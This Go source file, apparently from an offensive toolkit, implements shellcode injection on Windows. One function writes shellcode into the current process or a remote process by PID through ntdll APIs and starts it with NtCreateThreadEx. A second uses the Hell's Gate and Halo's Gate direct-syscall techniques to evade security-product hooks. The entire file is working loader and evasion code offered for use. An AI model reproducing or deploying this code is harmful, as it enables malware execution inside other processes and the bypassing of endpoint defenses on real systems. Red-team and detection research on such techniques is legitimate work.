package shellcode

import (
  "unsafe"
  "github.com/D3Ext/Hooka/evasion"
  "golang.org/x/sys/windows"
)

func NtCreateThreadEx(shellcode []byte, pid int) error {
  ntdll := windows.NewLazyDLL("ntdll.dll")
  kernel32 := windows.NewLazyDLL("kernel32.dll")

  NtAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
  NtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
  NtProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
  NtCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
  NtWaitForSingleObject := ntdll.NewProc("NtWaitForSingleObject")
  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  OpenProcess := kernel32.NewProc("OpenProcess")

	var pHandle uintptr

	if pid == 0 {
		pHandle, _, _ = GetCurrentProcess.Call()
	} else {
		pHandle, _, _ = OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, uintptr(0), uintptr(pid))
	}

  var addr uintptr
  regionsize := uintptr(len(shellcode))

  r1, _, err := NtAllocateVirtualMemory.Call(uintptr(pHandle), uintptr(unsafe.Pointer(&addr)), 0, uintptr(unsafe.Pointer(&regionsize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if r1 != 0 {
    return err
	}

	NtWriteVirtualMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), regionsize, 0)

	var oldProtect uintptr
	r2, _, err := NtProtectVirtualMemory.Call(uintptr(pHandle), uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&regionsize)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if r2 != 0 {
    return err
	}

	var hhosthread uintptr
	NtCreateThreadEx.Call(uintptr(unsafe.Pointer(&hhosthread)), 0x1FFFFF, 0, uintptr(pHandle), addr, 0, uintptr(0), 0, 0, 0, 0)

  NtWaitForSingleObject.Call(hhosthread, uintptr(0), 0xFFFFFFFF)

  return nil
}

/*

Hell's Gate + Halo's Gate technique

*/

func NtCreateThreadExHalos(shellcode []byte) error {

	NtAllocateVirtualMemory, err := evasion.GetSysId("NtAllocateVirtualMemory")
	if err != nil {
		return err
	}

	NtWriteVirtualMemory, err := evasion.GetSysId("NtWriteVirtualMemory")
	if err != nil {
		return err
	}

	NtProtectVirtualMemory, err := evasion.GetSysId("NtProtectVirtualMemory")
	if err != nil {
		return err
	}

	NtCreateThreadEx, err := evasion.GetSysId("NtCreateThreadEx")
	if err != nil {
		return err
	}

	var addr uintptr
	regionsize := uintptr(len(shellcode))

	r1, err := evasion.Syscall(
		NtAllocateVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if r1 != 0 {
		return err
	}

	evasion.Syscall(
		NtWriteVirtualMemory,
		uintptr(0xffffffffffffffff),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)

	var oldProtect uintptr
	r2, err := evasion.Syscall(
		NtProtectVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&regionsize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r2 != 0 {
		return err
	}

	var hhosthread uintptr
	r3, err := evasion.Syscall(
		NtCreateThreadEx,
		uintptr(unsafe.Pointer(&hhosthread)),
		0x1FFFFF,
		0,
		uintptr(0xffffffffffffffff),
		addr,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)

	windows.WaitForSingleObject(windows.Handle(hhosthread), 0xffffffff)

	if r3 != 0 {
		return err
	}

	return nil
}

